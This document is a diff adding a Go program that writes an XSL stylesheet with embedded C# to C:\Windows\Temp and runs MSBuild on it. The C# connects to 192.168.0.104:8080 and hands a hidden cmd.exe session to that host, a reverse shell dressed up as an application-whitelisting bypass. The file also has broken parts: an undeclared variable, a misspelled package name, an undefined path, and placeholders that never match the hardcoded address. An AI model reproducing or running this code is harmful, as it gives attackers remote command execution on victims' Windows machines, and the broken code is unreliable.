@@ -1,0 +1,102 @@
+package main
+
+import (
+	"fmt"
+	"os"
+	"os/exec"
+	"strings"
+)
+
+var inlinerxmlpath, inlinerxslpath string
+
+func init() {
+	tdu = `"<xsl:stylesheet version="2.0"
+	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+	xmlns:xslCSharp="urn:BypassTest">
+<msxsl:script implements-prefix='xslCSharp' language='Csharp'>
+<msxsl:using namespace="System.Net.Sockets" />
+<msxsl:using namespace="System.IO"/>
+<msxsl:using namespace="System.Diagnostics"/>
+public static StreamWriter streamWriter;
+public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+{
+	StringBuilder strOutput = new StringBuilder();
+	if (!String.IsNullOrEmpty(outLine.Data))
+	{
+		try
+		{
+			strOutput.Append(outLine.Data);
+			streamWriter.WriteLine(strOutput);
+			streamWriter.Flush();
+		}
+		catch (Exception ex) { throw ex; }
+	}
+}
+public void Execute()
+{
+	using (TcpClient client = new TcpClient("192.168.0.104", 8080))
+	{
+		using (Stream stream = client.GetStream())
+		{
+			using (StreamReader rdr = new StreamReader(stream))
+			{
+				streamWriter = new StreamWriter(stream);
+				StringBuilder strInput = new StringBuilder();
+				Process p = new Process();
+				p.StartInfo.FileName = "cmd.exe";
+				p.StartInfo.CreateNoWindow = true;
+				p.StartInfo.UseShellExecute = false;
+				p.StartInfo.RedirectStandardOutput = true;
+				p.StartInfo.RedirectStandardInput = true;
+				p.StartInfo.RedirectStandardError = true;
+				p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+				p.Start();
+				p.BeginOutputReadLine();
+				while (true)
+				{
+					strInput.Append(rdr.ReadLine());
+					p.StandardInput.WriteLine(strInput);
+					strInput.Remove(0, strInput.Length);
+				}
+			}
+		}
+	}
+}
+</msxsl:script>
+<xsl:template match="success" >
+<result>
+<xsl:value-of select="xslCSharp:Execute()" /> 
+</result> 
+</xsl:template>
+</xsl:stylesheet>`
+	inlinerxslpath = `C:\Windows\Temp\RunFromHere.xsl`
+	inlinerxmlpath = `C:\Windows\Temp\inliner.xml`
+}
+func checkerr(err error) {
+	fmt.Println(err)
+}
+
+func main() {
+	createmsbuildtemplate("RHOST", "REVPRT")
+	msbuild := exec.Command(msbuildpath, "C:/Windows/Temp/tdu.xml")
+	err := msbuild.Start()
+	checkerr(err)
+}
+func createxml() {
+	fxml, err := os.Create(inlinerxmlpath)
+	if err != nil {
+		fmr.Println(err)
+	}
+	fxml.Close()
+}
+func createmsbuildtemplate(ip, port string) {
+
+	ipreplaced := strings.Replace(tdu, "IP", ip, 1)
+	portreplaced := strings.Replace(ipreplaced, "PORT", port, 1)
+
+	fotduxml, err := os.Create("C:/Windows/Temp/tdu.xml")
+	checkerr(err)
+	defer fotduxml.Close()
+	fotduxml.WriteString(portreplaced)
+}
